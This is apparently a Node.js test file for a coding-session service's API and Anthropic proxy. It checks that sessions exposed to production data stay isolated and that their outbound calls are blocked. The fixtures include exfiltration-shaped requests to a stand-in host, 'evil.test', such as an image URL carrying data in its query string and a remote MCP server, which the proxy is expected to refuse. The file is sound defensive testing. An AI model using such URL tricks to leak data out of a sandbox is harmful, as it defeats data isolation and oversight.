import { test } from 'node:test';
import assert from 'node:assert/strict';

import http from 'node:http';
import { Readable } from 'node:stream';

import { createAnthropicProxy, serverSideReach } from './anthropicProxy.mjs';
import { createSessionApi, sessionTokenOf } from './sessionApi.mjs';
import { canOpenApp } from './server.mjs';

const quietly = (t) => {
  t.mock.method(console, 'log', () => {});
  t.mock.method(console, 'warn', () => {});
};

async function serve(t, handle) {
  const server = http.createServer((req, res) => handle(req, res));
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  t.after(() => server.close());
  return `http://127.0.0.1:${server.address().port}`;
}

function homesStandIn() {
  const saved = new Map();
  const copies = [];
  return {
    saved, copies,
    async put(name, req) { let n = 0; for await (const c of req) n += c.length; saved.set(name, n); return n; },
    async copy(from, to) { copies.push([from, to]); },
    async get(name) { return saved.has(name) ? { bytes: 1, stream: Readable.from(['tar']) } : null; },
  };
}

const userSettings = { view: () => ({ setUp: true }), noteHome() {} };

test('a tainted session\'s home stays its own: saved for its Resume, never copied to its owner\'s, never restored from it', async (t) => {
  quietly(t);
  const homes = homesStandIn();
  homes.saved.set('joel', 1);
  const sessions = [
    { id: 'aaaa1111', token: 'tok-a', status: 'running', owner: 'joel', taintedAt: '2026-11-19T10:00:00Z' },
    { id: 'bbbb2222', token: 'tok-b', status: 'running', owner: 'joel' },
  ];
  const base = await serve(t, createSessionApi({ fleet: { sessions: () => sessions }, tokens: null, homes, userSettings, claudeSettings: { sync: async () => ({ version: 1 }) } }));
  const post = (path, token, body = 'home') => fetch(`${base}${path}`, { method: 'POST', headers: { authorization: `Bearer ${token}` }, body });

  assert.equal((await post('/home', 'tok-a')).status, 200);
  assert.equal((await post('/home', 'tok-b')).status, 200);
  assert.deepEqual(homes.copies, [['joel/sessions/bbbb2222', 'joel']], 'only the untainted one reaches the owner\'s');
  assert.ok(homes.saved.has('joel/sessions/aaaa1111'));

  homes.saved.delete('joel/sessions/aaaa1111');
  assert.equal((await post('/home/restore', 'tok-a', '')).status, 404, 'no fall back to the owner\'s home');

  const sync = await post('/claude-settings', 'tok-a', JSON.stringify({ version: 0, changed: {}, removed: [] }));
  assert.equal(sync.status, 409);
  assert.match((await sync.json()).error, /production data/);
});

test('/egress hands a tainted session its proxy and the proxy\'s authority, and no other session either', async (t) => {
  quietly(t);
  const sessions = [
    { id: 'aaaa1111', token: 'tok-a', status: 'running', owner: 'joel', taintedAt: '2026-11-19T10:00:00Z' },
    { id: 'bbbb2222', token: 'tok-b', status: 'running', owner: 'joel' },
  ];
  const egress = { sessionUrl: 'http://host.docker.internal:7693', caPem: async () => 'PEM' };
  const base = await serve(t, createSessionApi({ fleet: { sessions: () => sessions }, tokens: null, egress }));
  const ask = (token) => fetch(`${base}/egress`, { method: 'POST', headers: { authorization: `Bearer ${token}` } });
  assert.deepEqual(await (await ask('tok-a')).json(), { proxy: 'http://host.docker.internal:7693', ca: 'PEM' });
  assert.equal((await ask('tok-b')).status, 404);
});

test('/mcp/<name> and /prod-mcp go to the relay with the session its bearer names, and are a 404 with no relay', async (t) => {
  quietly(t);
  const sessions = [{ id: 'aaaa1111', token: 'tok-a', status: 'running', owner: 'joel' }];
  const relayed = [];
  const mcpRelay = { isProxyPath: () => true, handle: async (req, res, session) => { relayed.push([req.method, req.url, session?.id ?? null]); res.writeHead(204).end(); } };
  const on = await serve(t, createSessionApi({ fleet: { sessions: () => sessions }, tokens: null, mcpRelay }));
  await fetch(`${on}/prod-mcp`, { method: 'POST', headers: { authorization: 'Bearer tok-a' }, body: '{}' });
  await fetch(`${on}/mcp/docs`, { headers: { authorization: 'Bearer nope' } });
  assert.deepEqual(relayed, [['POST', '/prod-mcp', 'aaaa1111'], ['GET', '/mcp/docs', null]]);
  assert.equal(sessionTokenOf({ url: '/mcp/docs', headers: { authorization: 'Bearer tok-a' } }), 'tok-a');
  const off = await serve(t, createSessionApi({ fleet: { sessions: () => sessions }, tokens: null }));
  assert.equal((await fetch(`${off}/prod-mcp`, { method: 'POST', headers: { authorization: 'Bearer tok-a' } })).status, 404);
  assert.equal(sessionTokenOf({ url: '/prod-mcp', headers: { authorization: 'Bearer tok-a' } }), 'tok-a');
});

test('a tainted session\'s call that would have Anthropic reach the internet is refused; any other goes on whole', async (t) => {
  quietly(t);
  const upstreamSeen = [];
  const upstream = await serve(t, (req, res) => {
    let body = '';
    req.on('data', (c) => { body += c; });
    req.on('end', () => { upstreamSeen.push(body); res.writeHead(200, { 'content-type': 'application/json' }).end('{"ok":true}'); });
  });
  const proxy = createAnthropicProxy({
    userSettings: { view: () => ({ claudeToken: { savedAt: 'x' } }), claudeToken: async () => 'sk-ant-oat01-owner' }, upstream,
  });
  const tainted = { id: 'aaaa1111', owner: 'joel', taintedAt: '2026-11-19T10:00:00Z' };
  const base = await serve(t, (req, res) => proxy.handle(req, res, tainted, 'plan'));
  const call = (body) => fetch(`${base}/anthropic/v1/messages`, { method: 'POST', headers: { 'content-type': 'application/json', authorization: 'Bearer tok' }, body: JSON.stringify(body) });

  const plain = { model: 'claude-opus-5-5', max_tokens: 10, messages: [{ role: 'user', content: 'hi' }], tools: [{ name: 'Bash', input_schema: {} }] };
  assert.equal((await call(plain)).status, 200);
  assert.deepEqual(JSON.parse(upstreamSeen[0]), plain);
  for (const reach of [
    { ...plain, tools: [{ type: 'web_search_20250305', name: 'web_search' }] },
    { ...plain, tools: [{ type: 'web_fetch_20250910', name: 'web_fetch' }] },
    { ...plain, mcp_servers: [{ type: 'url', url: 'https://evil.test/mcp', name: 'x' }] },
    { requests: [{ custom_id: 'a', params: { ...plain, tools: [{ type: 'web_search_20260101' }] } }] },
    { ...plain, messages: [{ role: 'user', content: [{ type: 'image', source: { type: 'url', url: 'https://evil.test/?d=row' } }] }] },
    { ...plain, messages: [{ role: 'user', content: [{ type: 'tool_result', tool_use_id: 't', content: [{ type: 'document', source: { type: 'URL', url: 'https://evil.test/' } }] }] }] },
  ]) {
    const refused = await call(reach);
    assert.equal(refused.status, 403);
    assert.match((await refused.json()).error.message, /production data/);
  }
  // A call the console cannot read is not sent either.
  const notJson = await fetch(`${base}/anthropic/v1/messages`, { method: 'POST', headers: { 'content-type': 'text/plain', authorization: 'Bearer tok' }, body: JSON.stringify(plain) });
  assert.equal(notJson.status, 415);
  const broken = await fetch(`${base}/anthropic/v1/messages`, { method: 'POST', headers: { 'content-type': 'application/json', authorization: 'Bearer tok' }, body: '{"model":' });
  assert.equal(broken.status, 400);
  assert.equal(upstreamSeen.length, 1);
  assert.equal(serverSideReach(plain), null);
});

test('a tainted session\'s app opens for its owner alone, whatever was shared', () => {
  const session = { id: 'a', owner: 'joel', taintedAt: '2026-11-19T10:00:00Z' };
  assert.equal(canOpenApp(session, 'joel', null, true), true);
  assert.equal(canOpenApp(session, 'ana', null, true), false);
  assert.equal(canOpenApp({ ...session, taintedAt: undefined }, 'ana', null, true), true);
});

test('a session that may use production is handed its own databases, never its owner\'s', async (t) => {
  quietly(t);
  const sessions = [{ id: 'cccc3333', token: 'tok-c', status: 'running', owner: 'joel', ownDatabases: true }];
  const own = { status: 'ready', database: { user: 'woodshed__cccc3333', password: 'p', name: 'woodshed__cccc3333' }, error: null };
  const databases = { available: true, async sessionDatabase(id) { return id === 'cccc3333' ? own : null; }, async credentials() { throw new Error('the owner\'s databases were asked for'); } };
  const userSettings = { claudeToken: async () => 'sk-ant-oat01-x', ownFiles: async () => ({}), view: () => ({}), gitIdentity: () => ({}), limitsFor: () => null };
  const base = await serve(t, createSessionApi({ fleet: { sessions: () => sessions }, tokens: null, userSettings, databases }));
  const answer = await fetch(`${base}/settings`, { method: 'POST', headers: { authorization: 'Bearer tok-c' } });
  assert.equal(answer.status, 200);
  assert.equal((await answer.json()).database.name, 'woodshed__cccc3333');
  own.status = 'working';
  own.database = null;
  assert.equal((await fetch(`${base}/settings`, { method: 'POST', headers: { authorization: 'Bearer tok-c' } })).status, 503);
});

test('a settings sync or a home whose body came in while the session was being locked down never reaches the owner\'s', async (t) => {
  quietly(t);
  const session = { id: 'dddd4444', token: 'tok-d', status: 'running', owner: 'joel' };
  let locking = false;
  const synced = [];
  const copies = [];
  const claudeSettings = { async sync(args) { synced.push(args); return { version: 2 }; } };
  const homes = { async put(name, req) { for await (const _ of req) { locking = true; } return 10; }, async copy(from, to) { copies.push([from, to]); } };
  const userSettings = { view: () => ({ setUp: true }), noteHome() {} };
  const fleet = { sessions: () => [session], isLocked: () => locking };
  const base = await serve(t, createSessionApi({ fleet, tokens: null, claudeSettings, homes, userSettings }));
  // The lockdown starts while the settings body is on its way.
  const body = new ReadableStream({ start(c) { c.enqueue(new TextEncoder().encode('{"version":1,')); setTimeout(() => { locking = true; c.enqueue(new TextEncoder().encode('"changed":{},"removed":[]}')); c.close(); }, 30); } });
  const sync = await fetch(`${base}/claude-settings`, { method: 'POST', headers: { authorization: 'Bearer tok-d' }, body, duplex: 'half' });
  assert.equal(sync.status, 409);
  assert.deepEqual(synced, []);
  locking = false;
  const home = await fetch(`${base}/home`, { method: 'POST', headers: { authorization: 'Bearer tok-d' }, body: 'tarball' });
  assert.equal(home.status, 200);
  assert.deepEqual(copies, [], 'its own home is kept, never copied to the owner\'s');
});
